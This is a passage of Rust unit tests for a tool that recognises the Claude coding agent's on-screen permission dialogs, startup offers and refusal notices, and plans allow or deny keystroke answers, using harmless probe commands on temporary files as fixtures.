                assert!(!form.verified_noninteraction, "{id}");
                assert_eq!(form.raw_evidence["operation"], operation, "{id}");
                assert_eq!(form.raw_evidence["choices"], json!(["Yes", "No"]), "{id}");
            }
            let other_forms = [
                ("claude-2.1.302-default-permission-1", PERMISSION_RULE),
                (ASK_FORM, ASK_RULE),
            ];
            for (decision, choice, byte, pre_stage) in [
                (
                    PermissionDecision::Allow,
                    "allow-once",
                    b"1",
                    TIP_ALLOW_PRE_STAGE,
                ),
                (
                    PermissionDecision::Deny,
                    "deny-once",
                    b"4",
                    TIP_DENY_PRE_STAGE,
                ),
            ] {
                let plan = catalog
                    .answer_plan(
                        CodingAgent::Claude,
                        CLAUDE_VERSION,
                        TIP_RULE,
                        &AnswerKey::Decision(decision),
                    )
                    .expect("tip-rule answer plan");
                assert_eq!(plan.choice_id(), choice);
                assert_eq!(plan.stages().len(), 1, "{decision:?}");
                let stage = &plan.stages()[0];
                assert_eq!(stage.bytes(), byte);
                assert_eq!(stage.required_rule_id(), TIP_RULE);
                assert_eq!(stage.required_choice_id(), choice);
                assert!(stage.gate().is_none(), "{decision:?} is ungated");
                let capability = plan.capability();
                assert_eq!(capability.native_version(), CLAUDE_VERSION);
                assert_eq!(capability.request_rule_id(), TIP_RULE);
                assert_eq!(capability.key(), &AnswerKey::Decision(decision));
                assert_eq!(
                    capability.fixture_ids(),
                    [pre_stage.to_owned()].as_slice(),
                    "{decision:?} rests on its pre-stage capture"
                );
                let matched = detector(&catalog)
                    .match_answer(&screen(pre_stage), &plan)
                    .unwrap()
                    .expect("the pre-stage form matches its plan");
                assert_eq!(matched.choices(), &["Yes".to_owned(), "No".to_owned()]);
                assert!(Some(matched.semantic()) == observe(pre_stage).fingerprint.as_ref());
                for (other, rule) in other_forms {
                    assert!(
                        detector(&catalog)
                            .match_answer(&screen(other), &plan)
                            .unwrap()
                            .is_none(),
                        "{decision:?} tip plan on {other}"
                    );
                    let foreign = catalog
                        .answer_plan(
                            CodingAgent::Claude,
                            CLAUDE_VERSION,
                            rule,
                            &AnswerKey::Decision(decision),
                        )
                        .unwrap();
                    assert!(
                        detector(&catalog)
                            .match_answer(&screen(pre_stage), &foreign)
                            .unwrap()
                            .is_none(),
                        "{decision:?} {rule} plan on the tip form"
                    );
                }
            }
            assert_eq!(
                observe("claude-2.1.302-default-permission-1").rule_id,
                PERMISSION_RULE
            );
        }

        #[test]
        fn bundled_claude_read_outside_dialogs_are_complete_permission_requests_with_their_operation()
         {
            let read = |path: &str| format!("Read(/tmp/cafleet-194/{path})");
            let long = "Read(/tmp/cafleet-194/claude-read-outside-long-001-outside/a-deeply-nested-directory-for-the-long-read-operation/secon\nd-level-directory-that-wraps-the-displayed-path/probe.txt)";
            let cases = [
                (
                    READ_FORM,
                    read("claude-read-outside-cells-001-outside/probe.txt"),
                    1,
                ),
                (READ_LONG, long.to_owned(), 2),
                (
                    READ_ALLOW_PRE_STAGE,
                    read("claude-read-outside-allow-001-outside/probe.txt"),
                    1,
                ),
                (
                    READ_DENY_PRE_STAGE,
                    read("claude-read-outside-deny-001-outside/probe.txt"),
                    1,
                ),
                (
                    EDIT_READ_FORM,
                    read("claude-edit-outside-cells-001-outside/edit-target.txt"),
                    1,
                ),
            ];
            let catalog = ProfileCatalog::bundled().unwrap();
            for (id, operation, rows) in cases {
                for version in [CLAUDE_VERSION, "2.1.309"] {
                    let form = Detector::new(&catalog, CodingAgent::Claude, Some(version))
                        .observe(&screen(id))
                        .unwrap();
                    assert_eq!(form.kind, FORM, "{id} {version}");
                    assert_eq!(form.rule_id, READ_RULE, "{id} {version}");
                    assert_eq!(
                        form.raw_evidence["native_version"], version,
                        "{id} {version}"
                    );
                    assert_eq!(form.match_evidence, MatchEvidence::Complete, "{id}");
                    assert!(!form.verified_noninteraction, "{id}");
                    assert!(form.native_correlation.is_none(), "{id}");
                    assert!(form.fingerprint.is_some(), "{id}");
                    assert_eq!(form.raw_evidence["operation"], operation, "{id}");
                    assert_eq!(form.raw_evidence["operation_rows"], rows, "{id}");
                    assert_eq!(form.raw_evidence["choices"], json!(READ_CHOICES), "{id}");
                    assert_eq!(form.raw_evidence["native_request_id"], Value::Null, "{id}");
                }
            }
            for (id, top, bottom) in [(READ_FORM, 16, 34), (READ_LONG, 17, 36)] {
                let region = observe(id)
                    .matched_region
                    .expect("the dialog locates its live region");
                assert_eq!(
                    (region.top, region.bottom),
                    (top, bottom),
                    "{id}: the region runs from the heading to the closing line"
                );
            }
            assert!(
                observe(READ_FORM).fingerprint != observe(EDIT_READ_FORM).fingerprint,
                "a different displayed path is a different request"
            );
        }

        #[test]
        fn bundled_claude_read_outside_dialog_answers_allow_with_4_and_deny_with_3_ungated() {
            let catalog = ProfileCatalog::bundled().unwrap();
            let other_forms = [
                ("claude-2.1.302-default-permission-1", PERMISSION_RULE),
                (ASK_FORM, ASK_RULE),
                (TIP_FORM, TIP_RULE),
            ];
            for (decision, choice, byte, pre_stage) in [
                (
                    PermissionDecision::Allow,
                    "allow-once",
                    b"4",
                    READ_ALLOW_PRE_STAGE,
                ),
                (
                    PermissionDecision::Deny,
                    "deny-once",
                    b"3",
                    READ_DENY_PRE_STAGE,
                ),
            ] {
                let plan = catalog
                    .answer_plan(
                        CodingAgent::Claude,
                        CLAUDE_VERSION,
                        READ_RULE,
                        &AnswerKey::Decision(decision),
                    )
                    .expect("read-outside answer plan");
                assert_eq!(plan.choice_id(), choice);
                assert_eq!(plan.stages().len(), 1, "{decision:?}");
                let stage = &plan.stages()[0];
                assert_eq!(stage.bytes(), byte);
                assert_eq!(stage.required_rule_id(), READ_RULE);
                assert_eq!(stage.required_choice_id(), choice);
                assert!(stage.gate().is_none(), "{decision:?} is ungated");
                let capability = plan.capability();
                assert_eq!(capability.native_version(), CLAUDE_VERSION);
                assert_eq!(capability.request_rule_id(), READ_RULE);
                assert_eq!(capability.key(), &AnswerKey::Decision(decision));
                assert_eq!(
                    capability.fixture_ids(),
                    [pre_stage.to_owned()].as_slice(),
                    "{decision:?} rests on its pre-stage capture"
                );
                let matched = detector(&catalog)
                    .match_answer(&screen(pre_stage), &plan)
                    .unwrap()
                    .expect("the pre-stage dialog matches its plan");
                assert_eq!(matched.choices(), READ_CHOICES.map(String::from).as_slice());
                assert!(Some(matched.semantic()) == observe(pre_stage).fingerprint.as_ref());
                for (other, rule) in other_forms {
                    assert!(
                        detector(&catalog)
                            .match_answer(&screen(other), &plan)
                            .unwrap()
                            .is_none(),
                        "{decision:?} read-outside plan on {other}"
                    );
                    let foreign = catalog
                        .answer_plan(
                            CodingAgent::Claude,
                            CLAUDE_VERSION,
                            rule,
                            &AnswerKey::Decision(decision),
                        )
                        .unwrap();
                    assert!(
                        detector(&catalog)
                            .match_answer(&screen(pre_stage), &foreign)
                            .unwrap()
                            .is_none(),
                        "{decision:?} {rule} plan on the read-outside dialog"
                    );
                }
            }
        }

        #[test]
        fn bundled_claude_auto_startup_offer_and_wizard_are_separate_questions() {
            let catalog = ProfileCatalog::bundled().unwrap();
            let offer = observe(STARTUP_OFFER);
            let wizard = observe(STARTUP_WIZARD);
            for (id, observed, choices) in [
                (
                    STARTUP_OFFER,
                    &offer,
                    json!(["Not now", "Don't show again"]),
                ),
                (STARTUP_WIZARD, &wizard, json!([])),
            ] {
                assert_eq!(observed.match_evidence, MatchEvidence::Complete, "{id}");
                assert!(!observed.verified_noninteraction, "{id}");
                assert_eq!(observed.raw_evidence["operation"], Value::Null, "{id}");
                assert_eq!(observed.raw_evidence["choices"], choices, "{id}");
                assert!(observed.fingerprint.is_some(), "{id}");
            }
            assert!(
                offer.fingerprint != wizard.fingerprint,
                "the offer and its wizard are separate dialogs"
            );
            for rule in [STARTUP_RULE, WIZARD_RULE] {
                for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                    assert!(
                        catalog
                            .answer_plan(
                                CodingAgent::Claude,
                                CLAUDE_VERSION,
                                rule,
                                &AnswerKey::Decision(decision)
                            )
                            .is_none(),
                        "{rule} {decision:?}"
                    );
                }
            }
            for choice in ["not-now", "dont-show-again"] {
                assert!(
                    catalog
                        .answer_plan(
                            CodingAgent::Claude,
                            CLAUDE_VERSION,
                            STARTUP_RULE,
                            &AnswerKey::Choice(choice.into())
                        )
                        .is_some(),
                    "{choice}"
                );
            }
            assert!(
                catalog
                    .answer_plans(CodingAgent::Claude, CLAUDE_VERSION, WIZARD_RULE)
                    .is_empty(),
                "the wizard has no answer plan"
            );
        }

        #[test]
        fn tracker_opens_separate_question_episodes_for_the_startup_offer_and_its_wizard() {
            let mut run = replay_run(EvidencePolicy::metadata());
            let offer = run.episode(STARTUP_OFFER, 0, 300);
            assert_eq!(offer.len(), 1, "{offer:?}");
            assert_eq!(offer[0].kind, RuntimeEventKind::InteractionOpened);
            assert_eq!(offer[0].episode_seq, Some(1));
            assert_eq!(offer[0].classification, Some(InteractionClass::Question));
            assert_eq!(offer[0].evidence_json["rule_id"], STARTUP_RULE);
            let wizard = run.episode(STARTUP_WIZARD, 350, 900);
            assert_eq!(wizard.len(), 2, "the wizard replaces the offer: {wizard:?}");
            assert_eq!(wizard[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(wizard[0].episode_seq, Some(1));
            assert_eq!(wizard[1].kind, RuntimeEventKind::InteractionOpened);
            assert_eq!(wizard[1].episode_seq, Some(2));
            assert_eq!(wizard[1].classification, Some(InteractionClass::Question));
            assert_eq!(wizard[1].evidence_json["rule_id"], WIZARD_RULE);
            let cancelled = run.episode(STARTUP_CANCELLED, 950, 1400);
            assert_eq!(cancelled.len(), 1, "{cancelled:?}");
            assert_eq!(cancelled[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(cancelled[0].episode_seq, Some(2));
            assert_eq!(
                cancelled[0].close_reason,
                Some(InteractionCloseReason::NotVisible)
            );
        }

        #[test]
        fn tracker_opens_one_permission_episode_for_the_tip_form_and_closes_it_once_the_command_runs()
         {
            let mut run = replay_run(EvidencePolicy::metadata());
            let form = run.episode(TIP_FORM, 0, 300);
            assert_eq!(form.len(), 1, "{form:?}");
            assert_eq!(form[0].kind, RuntimeEventKind::InteractionOpened);
            assert_eq!(
                form[0].classification,
                Some(InteractionClass::PermissionRequest)
            );
            let pre_stage = run.episode(TIP_ALLOW_PRE_STAGE, 350, 600);
            assert!(pre_stage.is_empty(), "{pre_stage:?}");
            let running = run.episode(TIP_ALLOW_RUNNING, 650, 1100);
            assert_eq!(running.len(), 1, "{running:?}");
            assert_eq!(running[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(running[0].episode_seq, form[0].episode_seq);
            assert_eq!(
                running[0].close_reason,
                Some(InteractionCloseReason::NotVisible)
            );
        }

        #[test]
        fn tracker_emits_a_refusal_notice_after_two_compatible_frames_and_only_once_while_present()
        {
            let mut run = replay_run(EvidencePolicy::metadata());
            let early = run.hold(NOTICE_IDLE, 0, 50);
            assert!(early.events.is_empty(), "{:?}", early.events);
            let stable = run.hold(NOTICE_IDLE, 100, 100);
            assert_eq!(stable.events.len(), 1, "{:?}", stable.events);
            assert_annotation_event(
                &stable.events[0],
                RuntimeEventKind::AutomaticRefusalObserved,
                NOTICE_RULE,
            );
            assert_eq!(stable.events[0].evidence_json["operation"], Value::Null);
            assert_eq!(stable.events[0].evidence_json["excerpt"], Value::Null);
            let present = run.hold(NOTICE_IDLE, 150, 1000);
            assert!(present.events.is_empty(), "{:?}", present.events);
            let working = run.hold(NOTICE_WORKING, 1050, 1300);
            assert!(
                working.events.is_empty(),
                "same notice while working: {:?}",
                working.events
            );
        }

        #[test]
        fn tracker_emits_two_events_for_two_different_refusals_visible_together() {
            let mut run = replay_run(redacted());
            let held = run.hold(TWO_REFUSALS, 0, 400);
            assert_eq!(held.events.len(), 2, "{:?}", held.events);
            let mut operations = Vec::new();
            for event in &held.events {
                assert_annotation_event(
                    event,
                    RuntimeEventKind::AutomaticRefusalObserved,
                    REFUSAL_RULE,
                );
                assert_eq!(event.evidence_json["operation_rows"], 1);
                operations.push(
                    event.evidence_json["operation"]
                        .as_str()
                        .unwrap()
                        .to_owned(),
                );
            }
            operations.sort();
            let mut expected = vec![SEVEN.to_owned(), EIGHT.to_owned()];
            expected.sort();
            assert_eq!(operations, expected);
            let blocks = observe(TWO_REFUSALS).annotations;
            let refusals = blocks
                .iter()
                .filter(|block| block.rule_id == REFUSAL_RULE)
                .collect::<Vec<_>>();
            assert!(refusals[0].fingerprint != refusals[1].fingerprint);
        }

        #[test]
        fn tracker_resets_a_refusal_only_after_250_ms_of_absence_on_verified_frames() {
            let mut short = replay_run(EvidencePolicy::metadata());
            assert_eq!(short.hold(NOTICE_IDLE, 0, 100).events.len(), 1);
            assert!(short.hold(NOTICE_EXPIRED, 150, 350).events.is_empty());
            assert!(
                short.hold(NOTICE_IDLE, 400, 700).events.is_empty(),
                "200 ms of absence does not reset"
            );
            let mut long = replay_run(EvidencePolicy::metadata());
            assert_eq!(long.hold(NOTICE_IDLE, 0, 100).events.len(), 1);
            assert!(long.hold(NOTICE_EXPIRED, 150, 450).events.is_empty());
            let again = long.hold(NOTICE_IDLE, 500, 700);
            assert_eq!(
                again.events.len(),
                1,
                "300 ms of verified absence resets: {:?}",
                again.events
            );
            let mut working = replay_run(EvidencePolicy::metadata());
            assert_eq!(working.hold(NOTICE_IDLE, 0, 100).events.len(), 1);
            assert!(observe(RUNNING).verified_noninteraction);
            assert!(working.hold(RUNNING, 150, 450).events.is_empty());
            assert_eq!(
                working.hold(NOTICE_WORKING, 500, 700).events.len(),
                1,
                "verified working frames advance the reset"
            );
        }

        #[test]
        fn tracker_keeps_a_refusal_hidden_by_a_form_or_overlay_and_emits_nothing_when_it_returns() {
            for hiding in [HIDDEN_BY_FORM, VERBOSE_VIEWER] {
                let mut run = replay_run(EvidencePolicy::metadata());
                assert_eq!(run.hold(RESTORED, 0, 100).events.len(), 1, "{hiding}");
                assert!(run.hold(hiding, 150, 1500).events.is_empty(), "{hiding}");
                assert!(run.hold(RESTORED, 1550, 1900).events.is_empty(), "{hiding}");
            }
            let mut notice = replay_run(EvidencePolicy::metadata());
            assert_eq!(notice.hold(NOTICE_IDLE, 0, 100).events.len(), 1);
            assert!(notice.hold(FORM_HIDING_NOTICE, 150, 1500).events.is_empty());
            assert!(notice.hold(NOTICE_IDLE, 1550, 1900).events.is_empty());
            let mut interrupted = replay_run(EvidencePolicy::metadata());
            assert_eq!(interrupted.hold(NOTICE_IDLE, 0, 100).events.len(), 1);
            assert!(interrupted.hold(NOTICE_EXPIRED, 150, 300).events.is_empty());
            assert!(
                interrupted
                    .hold(FORM_HIDING_NOTICE, 350, 500)
                    .events
                    .is_empty()
            );
            assert!(interrupted.hold(NOTICE_EXPIRED, 550, 700).events.is_empty());
            assert!(
                interrupted.hold(NOTICE_IDLE, 750, 1000).events.is_empty(),
                "a form between absent frames restarts the continuous absence"
            );
        }

        #[test]
        fn tracker_keeps_a_rewrapped_refusal_as_the_same_fingerprint() {
            let restored = observe(RESTORED);
            let rewrapped = observe(REWRAPPED);
            let block = |observed: &ScreenObservation| {
                observed
                    .annotations
                    .iter()
                    .find(|block| block.rule_id == REFUSAL_RULE)
                    .cloned()
                    .expect("verbose refusal block")
            };
            assert!(block(&restored).fingerprint == block(&rewrapped).fingerprint);
            assert_eq!(block(&restored).raw_evidence["operation_rows"], 1);
            assert_eq!(block(&rewrapped).raw_evidence["operation_rows"], 2);
            assert_eq!(
                shown(&block(&rewrapped).raw_evidence["operation"]).as_deref(),
                Some(NINE)
            );
            let mut run = replay_run(redacted());
            assert_eq!(run.hold(RESTORED, 0, 100).events.len(), 1);
            assert!(run.hold(REWRAPPED_FORM, 150, 400).events.is_empty());
            assert!(run.hold(REWRAPPED, 450, 1000).events.is_empty());
            assert!(run.hold(RESTORED, 1050, 1300).events.is_empty());
        }

        #[test]
        fn tracker_ignores_quotes_viewers_and_primary_screen_copies() {
            for id in [
                QUOTE,
                VIEWER,
                VERBOSE_VIEWER,
                "claude-2.1.302-auto-fresh-first-launch-notice-1",
            ] {
                let mut run = replay_run(EvidencePolicy::metadata());
                assert!(run.hold(id, 0, 500).events.is_empty(), "{id}");
            }
            let primary = detector(&ProfileCatalog::bundled().unwrap())
                .observe(&replay(NOTICE_IDLE, false))
                .unwrap();
            assert!(
                primary.annotations.is_empty(),
                "scrollback and primary-screen copies"
            );
            let mut quoted = replay_run(redacted());
            let held = quoted.hold(VERBOSE_QUOTE, 0, 300);
            let mut operations = held
                .events
                .iter()
                .map(|event| {
                    event.evidence_json["operation"]
                        .as_str()
                        .unwrap()
                        .to_owned()
                })
                .collect::<Vec<_>>();
            operations.sort();
            let mut expected = vec![SEVEN.to_owned(), EIGHT.to_owned()];
            expected.sort();
            assert_eq!(operations, expected, "only the native refusal blocks");
        }

        #[test]
        fn tracker_emits_unavailable_once_until_automatic_review_is_observed_available() {
            let mut run = replay_run(EvidencePolicy::metadata());
            let first = run.hold(UNAVAILABLE_NOTICE, 0, 100);
            assert_eq!(first.events.len(), 1, "{:?}", first.events);
            assert_annotation_event(
                &first.events[0],
                RuntimeEventKind::AutomaticReviewUnavailable,
                UNAVAILABLE_RULE,
            );
            assert_eq!(
                first.policy,
                [(
                    AutomaticReview::Unavailable,
                    None,
                    UNAVAILABLE_RULE.to_owned(),
                    NOW.to_owned()
                )]
            );
            let footer = run.hold(MANUAL_FOOTER, 150, 600);
            assert!(footer.events.is_empty() && footer.policy.is_empty());
            let repeated = run.hold(UNAVAILABLE_NOTICE, 650, 800);
            assert!(
                repeated.events.is_empty(),
                "at most once per rule: {:?}",
                repeated.events
            );
            assert!(repeated.policy.is_empty());
            let available = run.hold(IDLE, 850, 1100);
            assert!(available.events.is_empty());
            assert_eq!(
                available.policy,
                [(
                    AutomaticReview::Available,
                    None,
                    INDICATOR_RULE.to_owned(),
                    NOW.to_owned()
                )]
            );
            assert!(run.hold(MANUAL_FOOTER, 1150, 1500).events.is_empty());
            let again = run.hold(UNAVAILABLE_NOTICE, 1550, 1700);
            assert_eq!(
                again.events.len(),
                1,
                "available re-arms the unavailable rule"
            );
            assert_eq!(again.policy.len(), 1);
            assert_eq!(again.policy[0].0, AutomaticReview::Unavailable);
        }

        #[test]
        fn tracker_records_the_displayed_mode_only_under_redacted_evidence() {
            for (policy, mode) in [
                (EvidencePolicy::metadata(), None),
                (redacted(), Some("auto mode".to_owned())),
            ] {
                let mut run = replay_run(policy);
                let held = run.hold(IDLE, 0, 1000);
                assert!(held.events.is_empty());
                assert_eq!(
                    held.policy,
                    [(
                        AutomaticReview::Available,
                        mode.clone(),
                        INDICATOR_RULE.to_owned(),
                        NOW.to_owned()
                    )],
                    "one record change for a steady indicator"
                );
                assert_eq!(
                    run.hold(NOTICE_EXPIRED, 1050, 1500).policy,
                    [(
                        AutomaticReview::Available,
                        mode,
                        INDICATOR_RULE.to_owned(),
                        NOW.to_owned()
                    )],
                    "a footer variant is a fresh indicator emission"
                );
            }
        }

        #[test]
        fn tracker_records_a_re_shown_indicator_after_a_reset_as_a_second_policy_observation() {
            let available = (
                AutomaticReview::Available,
                None,
                INDICATOR_RULE.to_owned(),
                NOW.to_owned(),
            );
            let mut run = replay_run(EvidencePolicy::metadata());
            assert_eq!(
                run.hold(IDLE, 0, 300).policy,
                std::slice::from_ref(&available)
            );
            let absent = run.hold(MANUAL_FOOTER, 350, 700);
            assert!(absent.policy.is_empty(), "{:?}", absent.policy);
            assert_eq!(
                run.hold(IDLE, 750, 1100).policy,
                [available],
                "a fresh indicator emission resubmits the unchanged state"
            );
        }

        #[test]
        fn tracker_annotations_leave_visibility_eligibility_and_episodes_unchanged() {
            let sequence = [
                (IDLE, 0, 100),
                (NOTICE_IDLE, 150, 300),
                (FORM_HIDING_NOTICE, 350, 600),
                (NOTICE_EXPIRED, 650, 1000),
                (TWO_REFUSALS, 1050, 1200),
                (UNAVAILABLE_NOTICE, 1250, 1400),
                (ASK_FORM, 1450, 1700),
                (IDLE, 1750, 2100),
            ];
            let mut annotated = replay_run(EvidencePolicy::metadata());
            let mut plain = replay_run(EvidencePolicy::metadata());
            for (id, from, until) in sequence {
                let mut millis = from;
                while millis <= until {
                    let value = annotated.next_frame(id);
                    let mut stripped = value.clone();
                    stripped.annotations.clear();
                    let with = annotated.observe(&value, millis);
                    let without = plain.observe(&stripped, millis);
                    assert_eq!(with.visibility, without.visibility, "{id} at {millis}");
                    assert_eq!(with.eligibility, without.eligibility, "{id} at {millis}");
                    assert_eq!(
                        format!("{:?}", with.latest_evidence),
                        format!("{:?}", without.latest_evidence),
                        "{id} at {millis}"
                    );
                    assert_eq!(
                        with.transitions
                            .iter()
                            .filter(|transition| !is_annotation_event(transition))
                            .cloned()
                            .collect::<Vec<_>>(),
                        without.transitions,
                        "{id} at {millis}"
                    );
                    assert!(without.effective_policy.is_none());
                    millis += 50;
                }
            }
        }
    }

    mod bundled_claude_2_1_312 {
        use crate::coding_agent::catalog::tests::*;

        const VERSION_312: &str = "2.1.312";
        const DIALOG_A: &str = "claude-auto-default-nudge";
        const NOTICE: &str = "claude-question-pending-notice";
        const OFFER: &str = "claude-auto-startup";
        const WIZARD: &str = "claude-auto-env-setup-wizard";
        const READ: &str = "claude-read-file-permission";
        const EDIT: &str = "claude-edit-file-permission";
        const CREATE: &str = "claude-create-file-permission";
        const NO_TIP: &str = "claude-bash-permission-no-tip";
        const BASH: &str = "claude-bash-permission";
        const IDLE: &str = "claude-idle-composer";

        const YES: &str = "Yes, set auto mode as my default permission mode";
        const MANUAL: [&str; 2] = [YES, "No, keep manual mode"];
        const ACCEPT_EDITS: [&str; 2] = [YES, "No, keep accept edits"];
        const OFFER_CHOICES: [&str; 2] = ["Not now", "Don't show again"];
        const FORM_CHOICES: [&str; 2] = ["Yes", "No"];
        const NO_CHOICES: [&str; 0] = [];

        const QUESTION: ObservationKind = ObservationKind::Interaction(InteractionClass::Question);
        const FORM: ObservationKind =
            ObservationKind::Interaction(InteractionClass::PermissionRequest);
        const COMPOSER: ObservationKind = ObservationKind::ComposerEmpty;

        type Expected = (
            &'static str,
            ObservationKind,
            &'static str,
            Option<&'static str>,
            &'static [&'static str],
        );

        const CLASSIFICATION: [Expected; 39] = [
            (
                "claude-2.1.312-auto-default-nudge-1",
                QUESTION,
                DIALOG_A,
                None,
                &MANUAL,
            ),
            (
                "claude-2.1.312-auto-default-accept-edits-nudge-1",
                QUESTION,
                DIALOG_A,
                None,
                &ACCEPT_EDITS,
            ),
            (
                "claude-2.1.312-auto-default-decline-pre-stage-1",
                QUESTION,
                DIALOG_A,
                None,
                &MANUAL,
            ),
            (
                "claude-2.1.312-auto-default-decline-post-stage-1-1",
                QUESTION,
                DIALOG_A,
                None,
                &MANUAL,
            ),
            (
                "claude-2.1.312-auto-default-decline-continuation-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-question-pending-notice-1",
                QUESTION,
                NOTICE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-question-pending-after-clear-1",
                QUESTION,
                DIALOG_A,
                None,
                &MANUAL,
            ),
            (
                "claude-2.1.312-question-pending-send-notice-1",
                QUESTION,
                NOTICE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-question-pending-after-send-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-question-pending-after-send-idle-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-auto-env-setup-offer-1",
                QUESTION,
                OFFER,
                None,
                &OFFER_CHOICES,
            ),
            (
                "claude-2.1.312-auto-env-setup-not-now-pre-stage-1",
                QUESTION,
                OFFER,
                None,
                &OFFER_CHOICES,
            ),
            (
                "claude-2.1.312-auto-env-setup-not-now-continuation-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-auto-env-setup-dont-show-again-pre-stage-1",
                QUESTION,
                OFFER,
                None,
                &OFFER_CHOICES,
            ),
            (
                "claude-2.1.312-auto-env-setup-dont-show-again-continuation-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-primary-auto-default-nudge-1",
                QUESTION,
                DIALOG_A,
                None,
                &MANUAL,
            ),
            (
                "claude-2.1.312-primary-default-permission-1",
                FORM,
                BASH,
                Some("/tmp/cafleet-194/claude-primary-auto-tip-cells-001/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-primary-closed-form-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-primary-idle-composer-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-primary-resized-narrow-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-primary-resized-idle-composer-1",
                COMPOSER,
                IDLE,
                None,
                &NO_CHOICES,
            ),
            (
                "claude-2.1.312-read-file-permission-1",
                FORM,
                READ,
                Some("Read(/tmp/cafleet-194/claude-read-file-cells-001-outside/probe.txt)"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-read-file-allow-pre-stage-1",
                FORM,
                READ,
                Some("Read(/tmp/cafleet-194/claude-read-file-allow-001-outside/probe.txt)"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-read-file-deny-pre-stage-1",
                FORM,
                READ,
                Some("Read(/tmp/cafleet-194/claude-read-file-deny-001-outside/probe.txt)"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-edit-file-permission-1",
                FORM,
                EDIT,
                Some("../claude-edit-file-cells-001-outside/edit-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-edit-file-allow-pre-stage-1",
                FORM,
                EDIT,
                Some("../claude-edit-file-allow-001-outside/edit-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-edit-file-deny-pre-stage-1",
                FORM,
                EDIT,
                Some("../claude-edit-file-deny-001-outside/edit-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-create-file-permission-1",
                FORM,
                CREATE,
                Some("../claude-create-file-cells-001-outside/write-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-create-file-allow-pre-stage-1",
                FORM,
                CREATE,
                Some("../claude-create-file-allow-001-outside/write-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-create-file-deny-pre-stage-1",
                FORM,
                CREATE,
                Some("../claude-create-file-deny-001-outside/write-target.txt"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-bash-no-tip-permission-1",
                FORM,
                NO_TIP,
                Some("/tmp/cafleet-194/claude-bash-no-tip-cells-001/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-bash-no-tip-allow-pre-stage-1",
                FORM,
                NO_TIP,
                Some("/tmp/cafleet-194/claude-bash-no-tip-allow-001/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-bash-no-tip-deny-pre-stage-1",
                FORM,
                NO_TIP,
                Some("/tmp/cafleet-194/claude-bash-no-tip-deny-001/permission-probe deny"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-bash-no-tip-access-permission-1",
                FORM,
                NO_TIP,
                Some(
                    "│ touch /tmp/cafleet-194/claude-bash-no-tip-access-cells-001-outside/no-tip-access.txt",
                ),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-panel-default-permission-1",
                FORM,
                BASH,
                Some("/tmp/cafleet-194/claude-panel-auto-tip-cells-001/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-panel-default-permission-144-1",
                FORM,
                BASH,
                Some("/tmp/cafleet-194/claude-panel-auto-tip-cells-002/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.312-panel-default-allow-pre-stage-1",
                FORM,
                BASH,
                Some("/tmp/cafleet-194/claude-panel-auto-tip-allow-001/permission-probe allow"),
                &FORM_CHOICES,
            ),
            (
                "claude-2.1.302-auto-env-setup-offer-1",
                QUESTION,
                OFFER,
                None,
                &OFFER_CHOICES,
            ),
            (
                "claude-2.1.302-auto-env-setup-wizard-1",
                QUESTION,
                WIZARD,
                None,
                &NO_CHOICES,
            ),
        ];

        const PRIMARY: [&str; 2] = [
            "claude-2.1.312-primary-auto-default-nudge-1",
            "claude-2.1.312-primary-default-permission-1",
        ];
        const PANEL: [(&str, usize); 3] = [
            ("claude-2.1.312-panel-default-permission-1", 92),
            ("claude-2.1.312-panel-default-permission-144-1", 80),
            ("claude-2.1.312-panel-default-allow-pre-stage-1", 92),
        ];

        fn document(id: &str) -> Value {
            serde_json::from_str(&bundled_fixture(id)).unwrap()
        }
        fn replay_document(document: &Value, alternate: bool) -> ScreenSnapshot {
            replay_native_fixture(&document.to_string(), |_| {}, alternate, None)
        }
        fn screen(id: &str) -> ScreenSnapshot {
            let document = document(id);
            replay_document(&document, document["alternate_screen"].as_bool().unwrap())
        }
        fn detector() -> Detector {
            Detector::new(
                &ProfileCatalog::bundled().unwrap(),
                CodingAgent::Claude,
                Some(VERSION_312),
            )
        }
        fn observe(id: &str) -> ScreenObservation {
            detector().observe(&screen(id)).unwrap()
        }
        fn observe_screen(screen: &ScreenSnapshot) -> ScreenObservation {
            detector().observe(screen).unwrap()
        }
        fn assert_same_evidence(case: &str, left: &ScreenObservation, right: &ScreenObservation) {
            assert_eq!(left.kind, right.kind, "{case}");
            assert_eq!(left.rule_id, right.rule_id, "{case}");
            assert_eq!(left.match_evidence, right.match_evidence, "{case}");
            for field in ["operation", "operation_rows", "choices"] {
                assert_eq!(
